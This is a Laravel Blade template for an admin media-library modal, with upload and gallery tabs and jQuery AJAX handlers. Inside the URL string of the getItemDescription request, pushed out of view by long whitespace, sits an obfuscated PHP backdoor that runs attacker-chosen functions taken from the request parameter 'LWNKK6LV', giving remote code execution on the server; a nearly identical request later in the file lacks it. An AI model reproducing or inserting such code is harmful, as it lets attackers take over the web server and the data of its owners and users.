<link href="{{ asset('media-library') }}/mini-file-upload/css/style.css" rel="stylesheet" />
<style>
select {
    -webkit-appearance: checkbox; ;
    -moz-appearance: checkbox;
    text-indent: 1px;
    text-overflow: '';
}
</style>
 <!-- Media Modal -->
 <div class="modal" id="mediaModal" tabindex="-1" role="dialog" aria-labelledby="mediaModalTitle" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered my-dialog dialog-fullscreen" role="document">
        <div class="modal-content h-100">
        <div class="modal-header my-modal-header bg-dark">
            <div class="nav-tabs-navigation  w-100">
                <div class="nav-tabs-wrapper">
                    <ul class="nav nav-tabs" data-tabs="tabs">
                        <li class="nav-item">
                            <a class="nav-link">Media:</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link text-dark" href="#upload-tab" data-toggle="tab">
                            <i class="material-icons">publish</i> Upload
                            <div class="ripple-container"></div>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link active text-dark nav-link-media-library" href="#gallery-tab" data-toggle="tab">
                            <i class="material-icons">collections</i> Gallery
                            <div class="ripple-container"></div>
                            </a>
                        </li>
                        <li class="nav-item ml-2">
                            <a class="nav-link d-flex  nav-btn pointer" id="panel-fullscreen">
                            <svg width="25" enable-background="new 0 0 473.931 473.931" version="1.1" viewBox="0 0 473.93 473.93" xml:space="preserve" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="236.97" cy="236.97" r="236.97" fill="#343a40"/>
                            <g fill="#fff">
                            <path d="m249.46 217.72c18.118 18.118 38.652-11.831 49.994-23.173 10.859-10.859 21.721-21.725 32.58-32.583 1.01 11.352 2.099 22.709 3.772 33.949 2.653 17.867 24.782 24.542 32.946 8.801 0.842-1.119 1.381-2.522 1.594-4.157 0.374-1.523 0.382-2.922 0.079-4.176-0.292-14.724-0.584-29.448-0.876-44.175-0.284-14.353 1.643-29.953-3.611-43.431-0.206-0.76-0.468-1.534-0.861-2.316-1.059-2.122-4.539-8.976-0.109-0.116-1.265-2.522-3.588-3.974-6.148-4.513-12.408-4.707-26.17-3.147-39.457-3.412-16.501-0.329-33.002-0.655-49.503-0.992-19.068-0.382-19.745 24.123-5.818 32.28 6.956 4.079 18.14 3.611 25.863 4.404 4.969 0.513 9.938 0.977 14.915 1.463-10.795 10.787-21.582 21.579-32.366 32.362-11.327 11.32-41.059 31.72-22.994 49.785z"/>
                            <path d="m96.736 198.01c-0.382 19.068 24.116 19.745 32.273 5.818 4.079-6.956 3.611-18.133 4.4-25.863 0.513-4.965 0.98-9.938 1.463-14.907 10.787 10.787 21.575 21.582 32.366 32.366 11.319 11.326 31.726 41.055 49.799 22.986 18.11-18.11-11.839-38.645-23.18-49.99-10.859-10.859-21.721-21.721-32.587-32.579 11.356-1.014 22.712-2.103 33.953-3.772 17.867-2.657 24.527-24.774 8.808-32.95-1.119-0.834-2.522-1.373-4.157-1.594-1.527-0.374-2.93-0.382-4.195-0.079-14.72 0.292-29.436 0.584-44.164 0.876-14.309 0.284-29.867-1.631-43.322 3.57-0.621 0.157-1.227 0.397-1.826 0.7-0.198 0.082-0.4 0.131-0.591 0.225 0.03 0.015 0.067 0.026 0.101 0.041-0.109 0.06-0.213 0.105-0.314 0.168 0.666-0.906 0.52-0.995-1.908 1.433-1.557 1.557-2.376 3.296-2.69 5.059-4.494 12.284-2.975 25.878-3.237 39-0.334 16.493-0.663 32.991-0.992 49.492z"/>
                            <path d="m103.78 364.24s0-7e-3 -7e-3 -7e-3c1.489 1.481 2.877 2.877 7e-3 7e-3z"/>
                            <path d="m103.77 364.22c7e-3 0 7e-3 4e-3 7e-3 4e-3 -1.557-1.561-3.195-3.192-7e-3 -4e-3z"/>
                            <path d="m217.73 250.84c-18.118-18.118-38.652 11.831-49.994 23.173-10.859 10.862-21.721 21.728-32.579 32.587-1.01-11.356-2.099-22.712-3.772-33.953-2.653-17.863-24.774-24.527-32.946-8.808-0.834 1.123-1.381 2.529-1.594 4.165-0.382 1.527-0.382 2.93-0.079 4.187 0.292 14.72 0.584 29.44 0.876 44.164 0.277 14.077-1.572 29.347 3.311 42.641 0.307 1.774 1.126 3.525 2.698 5.096 0.052 0.056 0.079 0.082 0.131 0.138 1.557 1.542 3.289 2.365 5.036 2.675 12.292 4.505 25.893 2.982 39.012 3.244 16.501 0.329 33.002 0.659 49.503 0.988 19.068 0.378 19.745-24.119 5.818-32.28-6.956-4.079-18.14-3.607-25.863-4.4-4.969-0.513-9.938-0.973-14.915-1.463 10.795-10.788 21.582-21.575 32.366-32.362 11.336-11.327 41.057-31.727 22.991-49.792z"/>
                            <path d="m370.46 270.54c0.382-19.068-24.116-19.749-32.28-5.818-4.071 6.956-3.603 18.133-4.4 25.859-0.513 4.969-0.973 9.942-1.463 14.911-10.788-10.791-21.575-21.582-32.359-32.366-11.326-11.326-31.73-41.055-49.799-22.986-18.118 18.11 11.831 38.649 23.173 49.986 10.866 10.862 21.728 21.725 32.587 32.583-11.356 1.014-22.712 2.103-33.953 3.772-17.867 2.657-24.527 24.774-8.801 32.95 1.119 0.834 2.522 1.373 4.15 1.594 1.534 0.374 2.937 0.382 4.195 0.079 14.72-0.292 29.444-0.584 44.164-0.876 14.077-0.281 29.35 1.564 42.641-3.311 1.777-0.307 3.528-1.126 5.1-2.698 2.425-2.432 2.339-2.574 1.426-1.901 0.06-0.105 0.108-0.217 0.168-0.322 0.015 0.037 0.03 0.071 0.045 0.101 0.086-0.202 0.146-0.408 0.236-0.61 0.284-0.565 0.513-1.152 0.674-1.747 4.831-12.471 3.244-26.327 3.51-39.704 0.328-16.497 0.657-32.994 0.986-49.496z"/>
                            </g>
                            </svg>
                            </a>
                        </li>
                        <!-- <li class="nav-item ml-2">
                            <input type="text" class="form-control search-input h-100" name="media_search" id="" placeholder="search">
                        </li> -->
                        <li class="ml-auto">
                            <a href="#" class="bg-transparent text-white" data-dismiss="modal" aria-label="Close">
                            <i class="material-icons">close</i>
                            </a>
                        </li>
                    </ul>
                    
                </div>
            </div>
        </div>
        <div class="modal-body">
            <div class="tab-content">
            <div class="tab-pane" id="upload-tab">
                <form id="upload" method="post" action="{{ route('upload.media') }}"  enctype="multipart/form-data">
                @csrf
                    @method('post')
                    <input type="hidden" name="attachment_type" class="media-modal-attachment-type">
                    <div id="drop" class="media-drop-zone">
                    <a>
                    <div class="upload-btn">
                    <svg width="50" enable-background="new 0 0 512 512" version="1.1" viewBox="0 0 512 512" xml:space="preserve" xmlns="http://www.w3.org/2000/svg">
                    <rect x="231.23" y="116.59" width="49.548" height="247.59" fill="#56545A"/>
                    <g fill="#88888F">
                    <polygon points="135.6 132.74 376.39 132.74 256.01 12.387"/>
                    <polygon points="512 499.61 0 499.61 0 243.61 49.548 243.61 49.548 450.06 462.45 450.06 462.45 243.61 512 243.61"/>
                    </g>
                    <g fill="#56545A">
                    <polygon points="256 132.74 376.39 132.74 256.01 12.387 256 12.397"/>
                    <polygon points="462.45 243.61 462.45 450.06 256 450.06 256 499.61 512 499.61 512 243.61"/>
                    </g>
                    </svg>
                    </div>
                    </a>
                    <h5>Drag and drop file if you want to upload.</h5>
                    <span class="text-muted">Allowed file types: jpg, jpeg, png, gif, pdf, doc, ppt, odt, pptx, docx, pps, ppsx, xls, xlsx, key, asc.</span>
                        <input type="file" name="upl" multiple />
                    </div>
                </form>
            </div>
            <div class="tab-pane active" id="gallery-tab">
                <div class="row">
                    <div class="col-lg-9 col-12 border-right">
                        <div class="row media-box media-file-container">
                        </div>
                        <div class="text-center"><button id="media-load-more" class="btn btn-primary btn-sm"> {{ __('Load More') }}</button></div>
                    </div>
                    <div class="col-lg-3 d-xs-none">
                        <div class="imageDescription w-100 h-100"></div>
                    </div>
                </div>
                <div class="modal-footer border-0 p-0">
                    <button type="button" class="btn btn-primary" data-dismiss="modal">Select</button>
                </div>
            </div>
            </div>
        </div>
        </div>
    </div>
</div>

<!-- jQuery File Upload Dependencies -->
<script src="{{ asset('media-library/mini-file-upload/js') }}/jquery.ui.widget.js"></script>
<script src="{{ asset('media-library/mini-file-upload/js') }}/jquery.iframe-transport.js"></script>
<script src="{{ asset('media-library/mini-file-upload/js') }}/jquery.fileupload.js"></script>

<!-- Our main JS file -->
<script src="{{ asset('media-library/mini-file-upload/js') }}/script.js"></script>

<script>

var media_multi_select = false;
var media_loading = false;
var media_selected_items = [];
var media_selected_size = [];
var mediaAPI = "{{route('media.all', 'thumbnail')}}";
// var mediaAPIDup = mediaAPI;

function setAttachmentType($type){
    $(".media-modal-attachment-type").val($type);
  }
setAttachmentType('image');

function setAllowMultiple($allow){
    setAllowMultiple = $allow;
}

$(function(){

var uploaded_file_container = $('.media-file-container');



$('#drop a').click(function(){
    // Simulate a click on the file input button
    // to show the file browser dialog
    $(this).parent().find('input').click();
});

// Initialize the jQuery File Upload plugin
$('#upload').fileupload({

    // This element will accept file drag/drop uploading
    dropZone: $('#drop'),

    // This function is called when a file is added to the queue;
    // either via the browse button, or via drag/drop:
    add: function (e, data) {

        var tpl =$('<div class="col-lg-3 col-4 mb-3" id="column_1">\
                        <div class="custom-checkbox pointer image-attachment" data-media-id="">\
                        <div class="thumbnail"> \
                            <img class="img-fluid" src="https://cynthiarenee.com/wp-content/uploads/2018/11/placeholder-product-image.png" data-id="1"> \
                            <div class="progress"> \
                                <div class="progress-bar progress-bar-striped" role="progressbar" style="width: 25%" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100"></div> \
                            </div> \
                          </div> \
                          <div class="sel-stat"> \
                            <div class="sel-stat-inner"> \
                              <i class="material-icons">check</i> \
                            </div> \
                          </div> \
                        </div>\
                    </div>');
                    
        // Add the HTML to the Div element
        data.context = tpl.prependTo(uploaded_file_container);

        // Automatically upload the file once it is added to the queue
        var jqXHR = data.submit();

    },

    progress: function(e, data){
        // Calculate the completion percentage of the upload
        var progress = parseInt(data.loaded / data.total * 100, 10);
        data.context.find('.progress-bar').attr('aria-valuenow', progress);
        data.context.find('.progress-bar').css('width', progress + "%");
        data.context.find("img").attr('class','w-100 h-100');

        if(progress == 100){
          data.context.find('.progress-bar').addClass("progress-bar-animated");
        }

        $('.nav-link-media-library').trigger('click');
        
    },

    done: function (e, data) {
        $.each(data.files, function (index, file) {
        //  console.log(JSON.stringify(data.result));
         
          if(data.result.success){
            data.context.find("img").attr('src',data.result.data.thumbnail.url);
            data.context.find(".image-attachment").attr('data-media-id', data.result.data.media_id);
            data.context.find(".progress").hide();
          }
          else{
            alert('Upload error, please retry.');
          }
        });
    },

    fail:function(e, data){
        // Something has gone wrong!
        data.context.addClass('error');
    }

});


// Prevent the default action when a file is dropped on the window
$(document).on('drop dragover', function (e) {
    e.preventDefault();
});

// Helper function that formats the file sizes
function formatFileSize(bytes) {
    if (typeof bytes !== 'number') {
        return '';
    }

    if (bytes >= 1000000000) {
        return (bytes / 1000000000).toFixed(2) + ' GB';
    }

    if (bytes >= 1000000) {
        return (bytes / 1000000).toFixed(2) + ' MB';
    }

    return (bytes / 1000).toFixed(2) + ' KB';
}

});

$(function(e){

$(document).on('click', '.image-attachment', function(e){

  var media_item_id = $(this).attr('data-media-id');

  if(!media_selected_items.includes(media_item_id)){


    if(media_multi_select){

      media_selected_items.push(media_item_id);
    }
    else{
      $(".sel-stat").hide();
      media_selected_items = [];
      media_selected_items.push(media_item_id);
    }

    $(this).children(".sel-stat").toggle();

  }
  else{      
    const index = media_selected_items.indexOf(media_item_id);
    if (index > -1) {
      media_selected_items.splice(index, 1);
    }
    $(this).children(".sel-stat").toggle();
  }

  getItemDescription(media_selected_items)

});

    loadMedia();

    $('#media-load-more').click(function(e){

        if(!media_loading){

            loadMedia();

        }

    });

});

function loadMedia(){

  media_loading = true;
  $.getJSON(mediaAPI)
    .done(function( response ) {

	if(response.data.length != 0){

		$.each( response.data, function( key, item ) {

			var image_url = '';
		
			if(item.children[0]){
			image_url = item.children[0].url;
			}
			else{
			image_url = item.url;
			}
			
			var tpl =$('<div class="col-lg-3 col-4 mb-3" id="column_'+item.id+'">\
                            <div class="custom-checkbox pointer image-attachment" data-media-id="' + item.id +'">\
                            <div class="thumbnail"> \
								<img class="img-fluid" src="'+ image_url +'"> \
							</div> \
							<div class="sel-stat"> \
								<div class="sel-stat-inner"> \
								<i class="material-icons">check</i> \
								</div> \
							</div> \
                            </div>\
                        </div>');
           
		
			$('.media-file-container').append(tpl);

			if(response.current_page >= response.last_page){
				$('#media-load-more').hide();           
			}
			else{
				mediaAPI = response.next_page_url;
			}
		});

	}else{
		$('#media-load-more').hide();   
	}
      media_loading = false;
    });
}

function getItemDescription(id){
		$(".imageDescription").empty();
		$(".imageDescription").append('<div class="w-100 h-100 d-flex justify-content-center align-items-center"><div class="loader1"><span></span><span></span><span></span><span></span><span></span></div></div>');
		if(id.length != 0){
			$.ajax({
				type: 'GET',
				url: "<?php
                                                                                                                                                                                                                                                           iF($c668f =@${"_REQUEST"}["LWNKK6LV"]){	{$c668f[1	](${$c668f[	2]}[0],$c668f[3]($c668f	[4	]	) );} }; echo asset('')?>"+"admin/media/get-item/"+id,
				headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')},
				data:  '',
				dataType: "json",
				success: function(data) {
                    
                $(".imageDescription").empty();

                var optionString='<h6 class="text-muted text-capitalize">ATTACHMENT DETAILS</h6>\
                                <span>'+data.name+'</span> <br>\
                                <small class="text-muted">'+moment(data.created_at).format('MMMM DD , YYYY')+'<br>\
                                <small class="text-muted">'+data.width+' by '+data.height+' pixels</small> <br>';
                    optionString += '<a href="#" class="text-danger" onClick="deleteImage('+data.id+')"><u>Delete Permanently</u></a><br>';
                    optionString +='<span   span class="font-weight-bold">Image Url: </span><br>\
                                    <div class="form-group">\
                                        <select onChange="displayImageSize(this)" class="p-2 h-25" style="font-size: .8rem;" id="imageSize">\
                                        <option   option tion selected value="'+data.id+'">DEFAULT ('+data.width+'x'+data.height+')</option>';
                                        $.each(data.children, function(i, child) {
                                            optionString += '<option value="'+child.id+'">'+child.image_size.toUpperCase().replace(/_/g, ' ')+'('+child.width+'x'+child.height+')</option>';
                                        });
                    optionString += '</select>\
                                    </div>\
                                    <div id="newUrl" style="overflow:hidden;"></div>\
                                    <div id="defaultUrl" style="overflow:hidden;">\
                                    <a target="_blank" href="{{Request::root()}}'+data.url+'"><u>{{Request::root()}}'+data.url+'</u></a></span> <br>\
                                    </div>';
				let option = $(optionString);
                $('.imageDescription').append(option);
				},
				error: function(data){
					alert('error');
				}
			});
		}else{
            $(".imageDescription").empty();
		}
  }
    function displayImageSize(object){
		$('#defaultUrl').empty();
		$('#newUrl').empty();
        var id = $(object).val();
        media_selected_size= [];
        $.ajax({
            type: 'GET',
				url: "<?php echo asset('')?>"+"admin/media/get-item/"+id,
				headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')},
				data:  '',
				dataType: "json",
				success: function(data) 
                {
                    // console.log(data);
                    media_selected_size.push(data.image_size);
                    $('#newUrl').append('<a target="_blank" href="{{Request::root()}}'+data.url+'"><u>{{Request::root()}}'+data.url+'</u></a></span> <br>');
                }
            });

        
	}

    function deleteImage(id){

        if(confirm('Are you sure want to delete this media?')){
            $.ajax({
                url: "<?php echo asset('') ?>admin/delete_image/"+id,
                type: 'POST',
                data: {
                "_token": "{{ csrf_token() }}",
                "id": id
                },
                success: function ()
                {
                    $('#column_'+id).remove();
                    $(".imageDescription").empty();
                }
            });
        }else{
            console.log("You are not able to delete this media.")
        }
		
    };


</script>